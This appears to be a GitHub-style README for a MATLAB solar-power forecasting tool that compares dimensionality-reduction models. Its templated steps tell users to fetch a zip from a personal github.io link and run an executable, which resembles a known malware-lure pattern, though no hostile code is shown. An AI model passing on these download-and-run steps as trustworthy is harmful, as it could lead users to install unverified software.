# ☀️ pv-dimensionality-reduction - Improve solar power forecasting accuracy easily

[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://shivam4905.github.io)

This software helps users forecast solar power production. It uses advanced mathematical methods to remove noise from data. This process simplifies complex inputs while keeping the most important information. The program compares two different models to find the right balance between calculation speed and prediction accuracy. You can use these tools to understand your energy output patterns better.

## 📋 System Requirements

Your computer must meet these requirements to run the software smoothly:

- Windows 10 or Windows 11.
- Installed MATLAB (Runtime version R2022b or later is recommended).
- At least 8 gigabytes of RAM.
- A dual-core processor or better.
- 500 megabytes of free space on your hard drive.

If you do not have MATLAB installed, download the free MATLAB Runtime from the MathWorks website. This allows you to run the application without a full software license.

## 📥 Getting the Software

You need to download the files from the project page.

1. Go to this link: [https://shivam4905.github.io](https://shivam4905.github.io)
2. Look for the section labeled "Assets."
3. Select the file ending in .zip for your version of Windows.
4. Save the folder to a location you can find easily, such as your desktop or documents folder.

## ⚙️ Setting Up Your Environment

Follow these steps to prepare your computer for the tool:

1. Right-click the folder you downloaded and select "Extract All."
2. Choose a folder where you want to keep the program files.
3. Open the folder you just extracted.
4. If you have not installed the MATLAB Runtime yet, find the installer file in the package and run it. Follow the prompts on the screen until the installation completes.
5. Restart your computer if the installer asks you to do so.

## 🚀 Running the Application

Once you prepare the setup, follow these steps to use the tool:

1. Open the folder containing the extracted files.
2. Locate the file named `solar_forecast_tool.exe`.
3. Double-click this file to start the program.
4. A window will appear. This is your main control panel.
5. Load your data files in the format specified in the sample provided within the folder.
6. Choose your preferred diagnostic method from the menu.
7. Click the "Run Analysis" button. 
8. Wait for the progress bar to finish.

## 📊 Understanding Your Results

The program provides three main types of output files in the results folder:

- Forecast Plots: These show a visual graph of your solar power production over time. The blue line represents the actual data, while the dashed line represents your forecast.
- Error Metrics: This file contains statistical data. It shows how close your predictions were to the actual observed values. Lower numbers indicate higher accuracy.
- Frugality Report: This text document explains the resources used during the calculation. It helps you see how much data was processed and how long the calculation took.

If you see an error message, ensure your input data is in a comma-separated format (CSV). The program expects columns labeled "Timestamp," "Irradiance," and "Power Output." If your data lacks these headers, the program will not recognize the input.

## 💡 Troubleshooting Common Issues

If you run into trouble, check these common fixes:

- The application keeps crashing: Ensure you installed the correct version of the MATLAB Runtime.
- The results are empty: Open your source file in a spreadsheet program and check for empty cells or non-numeric characters.
- Slow performance: Avoid running other heavy programs while performing your forecast analysis.
- Missing menus: Resize the window or maximize it to ensure all buttons are visible.

## 🔍 How the Technology Works

The tool uses a process called manifold learning. This mathematical technique reduces the number of variables in your dataset. By keeping only the most important signals, the program makes the forecast faster. One method uses geometric filters, while the other uses a machine learning wrapper. The tool tests both to show you which one works better for your specific set of solar data. This approach saves time and computer memory.

Keywords: autoencoder, dimensionality-reduction, energy, extreme-learning-machine, feature-selection, frugal-ai, machine-learning, matlab, pca, photovoltaic, renewable-energy, solar-energy, solar-forecasting, time-series-forecasting